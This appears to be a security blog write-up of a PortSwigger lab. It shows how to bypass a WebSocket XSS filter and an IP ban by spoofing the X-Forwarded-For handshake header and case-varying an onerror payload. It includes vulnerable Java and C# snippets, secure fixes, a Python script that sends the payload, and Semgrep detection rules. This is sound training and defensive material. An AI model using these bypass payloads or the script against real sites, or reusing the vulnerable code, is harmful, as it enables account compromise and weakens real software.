---
title: "Lab 02: Manipulating the WebSocket handshake to exploit vulnerabilities"
date: 2025-12-18
categories: [portswigger, websockets]
tags: [websocket] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-17-lab11_access_control/
--- 


## 1. Executive Summary

**Vulnerability:** XSS Filter Bypass & IP Ban Circumvention (via Handshake Manipulation).

**Description:** The application employs a Web Application Firewall (WAF) or server-side filter to block common XSS payloads in WebSocket messages. When an attack is detected, the server bans the user's IP address. However, the server's IP-tracking logic relies on the `X-Forwarded-For` header, which can be spoofed. Furthermore, the XSS filter is "case-sensitive" and fails to account for alternative JavaScript syntax.

**Impact:** Attackers can bypass IP-based blacklisting and successfully execute XSS attacks on support agents, potentially leading to full account compromise.

## 2. The Attack

**Objective:** Bypass the IP ban and trigger an `alert()` using an obfuscated payload.

1. **Reconnaissance & Failure:** I sent a standard XSS payload: `<img src=1 onerror='alert(1)'>`. The server immediately terminated the connection and banned my IP.
2. **IP Spoofing (Handshake Manipulation):**
    - I went to the **WebSocket Handshake** request (the initial HTTP `GET` request with the `Upgrade: websocket` header).
    - I added the header `X-Forwarded-For: 1.1.1.1`.
    - This tricked the server into thinking the request came from a new, unbanned IP.
    - But the message is denied because of defense that detected XSS payload
3. **Filter Evasion:**
    - Chaning the IP `X-Forwarded-For: 1.1.1.2`
    - Knowing the filter was "aggressive," I attempted to bypass its signature matching.
    - I used **case variation** for the event handler (`oNeRrOr`) and **backticks** instead of parentheses for the `alert` function.
    - *Payload:* `<img src=1 oNeRrOr=alert`1`>`
4. **Result:** The filter did not recognize this as an attack. The message was sent, and the `alert()` was triggered in the agent's browser.

## 3. Code Review

### Java (Spring Boot / IP Tracking)

```java
// VULNERABLE: Trusting headers for IP identification
String clientIp = request.getHeader("X-Forwarded-For");
if (isBanned(clientIp)) {
    throw new AccessDeniedException("Banned");
}

// VULNERABLE: Simple Regex/String-based XSS filtering
if (message.toLowerCase().contains("onerror=") || message.contains("alert(")) {
    banIp(clientIp);
    closeConnection();
}
```

**Technical Flow & Syntax Explanation:**

- **`request.getHeader("X-Forwarded-For")`**: The application looks for this header to identify the user. In a secure environment, this header should only be trusted if it comes from a **trusted proxy**. Here, the app accepts it from the raw client request, allowing for trivial spoofing.
- **`message.contains("alert(")`**: This is a **Blacklist-based** filter. It specifically looks for the string `alert(`. By using backticks (`alert`1``), the attacker provides a valid JavaScript syntax that does not match this specific string pattern.
- **The Logic Gap**: The filter is not "Context-Aware." It doesn't understand that `oNeRrOr` and `onerror` are functionally identical in HTML.

### C# (ASP.NET Core / WAF Middleware)

```csharp
// VULNERABLE: IP extraction logic
var remoteIp = context.Request.Headers["X-Forwarded-For"].FirstOrDefault();

// VULNERABLE: Incomplete signature matching
var blackList = new List<string> { "<script>", "onerror=" };
if (blackList.Any(token => message.Contains(token))) {
    TerminateSession(remoteIp);
}
```

**Technical Flow & Syntax Explanation:**

- **`Headers["X-Forwarded-For"]`**: The code retrieves the first IP from the forwarded list. Since an attacker can provide this list, they can change their identity at will.
- **`message.Contains(token)`**: This is a **case-sensitive** check in C# by default. If the blacklist contains `onerror=`, it will fail to catch `oNeRrOr=`.
- **The Logic Gap**: The server relies on identifying "known bad" patterns (Blacklisting) rather than enforcing "known good" patterns (Whitelisting).

---

### Mock PR Comment

The current security implementation relies on a blacklist filter and the `X-Forwarded-For` header for banning. Both are easily bypassed. An attacker can spoof their IP to bypass bans and use case-variation or backticks to bypass the XSS filter.

Please:

1. Configure the application to only accept `X-Forwarded-For` from a **trusted proxy IP**.
2. Replace the string-based filter with a robust **HTML Sanitization library** that parses the DOM context rather than searching for text patterns.

## 4. The Fix

**Explanation of the Fix:**
We must use a trusted source for IP addresses and a professional-grade sanitizer that handles HTML parsing correctly, regardless of casing or alternative JS syntax.

### Secure Java

```java
// SECURE: Use remote address from the socket, not the header
String secureIp = request.getRemoteAddr(); 

// SECURE: Use a policy-based sanitizer
PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
String safeMessage = policy.sanitize(rawMessage);
```

**Technical Flow & Syntax Explanation:**

- **`request.getRemoteAddr()`**: This retrieves the actual IP address from the TCP connection. While this might be a proxy IP, it cannot be spoofed by the end-user in the same way an HTTP header can.
- **`Sanitizers.FORMATTING`**: Instead of looking for "bad words," this library strips out *all* HTML tags and attributes unless they are explicitly allowed in the policy. Attributes like `onerror` are never allowed, regardless of their casing (`oNeRrOr`).

### Secure C#

```csharp
// SECURE: Use the standard connection property
var secureIp = context.Connection.RemoteIpAddress.ToString();

// SECURE: HTML Encode everything broadcasted
string safeMessage = HtmlEncoder.Default.Encode(rawMessage);
```

**Technical Flow & Syntax Explanation:**

- **`context.Connection.RemoteIpAddress`**: Pulls the IP from the network layer, not the application layer headers.
- **`HtmlEncoder.Default.Encode`**: This converts characters like `<` and `>` into `&lt;` and `&gt;`. Even if the attacker sends `<img oNeRrOr=...>`, it will be rendered as literal text in the agent's browser and will never execute.

## 5. Automation

```python
#!/usr/bin/env python3
import argparse
import websocket
import json

def exploit_ws_spoof(url, spoofed_ip, payload):
    ws_url = url.replace("https://", "wss://").rstrip("/") + "/chat"

    headers = {
    "X-Forwarded-For": spoofed_ip
    }
    print(f"[*] Connecting with Spoofed IP: {spoofed_ip}")

    try:
        ws = websocket.create_connection(ws_url, header=headers)
        message = json.dumps({"message":payload})
        ws.send(message)
        print(f"[+] Payload sent: {payload}")
        ws.close()
    except Exception as e:
        print(f"[-] Connection failed: {e}")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    ap.add_argument("ip", help="New IP to spoof (e.g. 1.2.3.4)")
    ap.add_argument("--payload", default="<img src=1 oNeRrOr=alert`1`>")
    args = ap.parse_args()
    exploit_ws_spoof(args.url, args.ip, args.payload)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

**The Logic:We are looking for code that retrieves the `X-Forwarded-For` header for security purposes (banning/limiting) and code that performs incomplete case-sensitive string checks on user input.**

### Java Rule

```yaml
rules:
  - id: java-trusting-xff-header
    languages: [java]
    message: "Trusting X-Forwarded-For header can lead to IP spoofing."
    severity: WARNING
    patterns:
      - pattern: $REQ.getHeader("X-Forwarded-For")

  - id: java-insufficient-xss-filter
    languages: [java]
    message: "Case-sensitive or partial XSS filters are easily bypassed."
    severity: WARNING
    patterns:
      - pattern: $STR.contains("onerror=")
      - pattern-not: $STR.toLowerCase().contains("onerror=")
```

**Technical Flow & Syntax Explanation:**

- **`$REQ.getHeader("X-Forwarded-For")`**: Flags any attempt to read the spoofable header.
- **`$STR.contains("onerror=")`**: Flags string-matching filters.
- **`pattern-not`**: Highlights that even using `toLowerCase()` is often insufficient, though it's a step better than raw `contains`.

### C# Rule

```yaml
rules:
  - id: csharp-trusting-xff-header
    languages: [csharp]
    message: "X-Forwarded-For header detected. Ensure it's only from a trusted proxy."
    severity: WARNING
    patterns:
      - pattern: $REQ.Headers["X-Forwarded-For"]

  - id: csharp-case-sensitive-filter
    languages: [csharp]
    message: "Default .Contains() in C# is case-sensitive. Use a sanitizer instead."
    severity: WARNING
    patterns:
      - pattern: $S.Contains("onerror=")
```

**Technical Flow & Syntax Explanation:**

- **`$REQ.Headers["X-Forwarded-For"]`**: Identifies where the application might be making decisions based on client-provided IP headers.
- **`$S.Contains("onerror=")`**: In .NET, `string.Contains` is case-sensitive. This rule flags the developer's failure to account for casing variations like `oNeRrOr`.
